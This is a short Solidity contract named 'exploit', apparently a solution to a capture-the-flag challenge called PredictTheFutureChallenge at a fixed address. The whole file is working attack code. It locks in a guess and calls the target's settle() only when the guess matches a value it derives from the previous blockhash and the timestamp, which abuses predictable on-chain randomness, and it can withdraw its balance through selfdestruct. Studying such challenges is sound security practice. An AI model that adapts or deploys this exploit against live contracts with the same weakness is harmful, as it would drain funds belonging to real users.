pragma solidity ^0.4.21;

import "./ownership.sol";

contract exploit {
    uint8 guess = 9;
    PredictTheFutureChallenge challenge =
        PredictTheFutureChallenge(
            address(0x2Ebf1E3c24D9917a2349257cA7F6CACafe3c53C6)
        );

    function() external payable {
        // fallback
    }

    function getBalance() public returns (uint256) {
        return address(this).balance;
    }

    function commitSuicide() public {
        selfdestruct(msg.sender);
    }

    function lockGuess() public payable returns (bool) {
        challenge.lockInGuess.value(msg.value)(guess);
    }

    function settle() public payable returns (bool) {
        require(
            guess ==
                uint8(keccak256(block.blockhash(block.number - 1), now)) % 10
        );
        challenge.settle();
    }
}
